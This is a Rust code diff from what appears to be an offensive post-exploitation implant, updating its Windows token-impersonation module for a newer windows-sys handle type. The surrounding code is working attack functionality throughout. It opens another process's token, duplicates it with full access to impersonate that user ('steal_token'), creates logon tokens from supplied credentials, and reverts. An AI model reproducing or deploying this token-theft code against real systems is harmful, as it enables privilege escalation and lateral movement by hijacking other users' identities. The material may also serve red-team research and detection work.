@@ -9,7 +9,7 @@ pub struct TokenState {
     pub impersonating: bool,
     pub impersonated_user: Option<String>,
     #[cfg(target_os = "windows")]
-    token_handle: isize, // HANDLE
+    token_handle: *mut std::ffi::c_void, // HANDLE
 }
 
 impl TokenState {
@@ -18,7 +18,7 @@ impl TokenState {
             impersonating: false,
             impersonated_user: None,
             #[cfg(target_os = "windows")]
-            token_handle: 0,
+            token_handle: std::ptr::null_mut(),
         }
     }
 }
@@ -32,11 +32,13 @@ mod win {
     use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
     use windows_sys::Win32::Security::{
         DuplicateTokenEx, GetTokenInformation, ImpersonateLoggedOnUser, LogonUserW,
-        LookupAccountSidW, OpenProcessToken, RevertToSelf, SecurityImpersonation,
+        LookupAccountSidW, RevertToSelf, SecurityImpersonation,
         TokenImpersonation, TokenUser, LOGON32_LOGON_NEW_CREDENTIALS,
         LOGON32_PROVIDER_DEFAULT, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_USER,
     };
-    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION};
+    use windows_sys::Win32::System::Threading::{
+        OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
+    };
 
     /// Maximum access for the duplicated token.
     const TOKEN_ALL_ACCESS: u32 = 0x000F_01FF;
@@ -93,7 +95,7 @@ mod win {
     pub fn steal_token(state: &mut TokenState, pid: u32) -> Result<(i32, String, String)> {
         unsafe {
             let proc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
-            if proc == 0 {
+            if proc.is_null() {
                 return Ok((
                     1,
                     String::new(),
@@ -101,7 +103,7 @@ mod win {
                 ));
             }
 
-            let mut token: HANDLE = 0;
+            let mut token: HANDLE = std::ptr::null_mut();
             if OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut token) == 0 {
                 let err = GetLastError();
                 CloseHandle(proc);
@@ -113,7 +115,7 @@ mod win {
             }
             CloseHandle(proc);
 
-            let mut dup_token: HANDLE = 0;
+            let mut dup_token: HANDLE = std::ptr::null_mut();
             if DuplicateTokenEx(
                 token,
                 TOKEN_ALL_ACCESS,
@@ -147,7 +149,7 @@ mod win {
                 lookup_token_user(dup_token).unwrap_or_else(|| "unknown".to_string());
 
             // Clean up previous impersonation token.
-            if state.impersonating && state.token_handle != 0 {
+            if state.impersonating && !state.token_handle.is_null() {
                 CloseHandle(state.token_handle);
             }
 
@@ -181,7 +183,7 @@ mod win {
         let pass_w: Vec<u16> = password.encode_utf16().chain(std::iter::once(0)).collect();
 
         unsafe {
-            let mut token: HANDLE = 0;
+            let mut token: HANDLE = std::ptr::null_mut();
             if LogonUserW(
                 user_w.as_ptr(),
                 domain_w.as_ptr(),
@@ -209,7 +211,7 @@ mod win {
             }
 
             // Clean up previous impersonation token.
-            if state.impersonating && state.token_handle != 0 {
+            if state.impersonating && !state.token_handle.is_null() {
                 CloseHandle(state.token_handle);
             }
 
@@ -236,13 +238,13 @@ mod win {
                 ));
             }
 
-            if state.token_handle != 0 {
+            if !state.token_handle.is_null() {
                 CloseHandle(state.token_handle);
             }
 
             state.impersonating = false;
             state.impersonated_user = None;
-            state.token_handle = 0;
+            state.token_handle = std::ptr::null_mut();
 
             Ok((0, "[*] Reverted to self".to_string(), String::new()))
         }
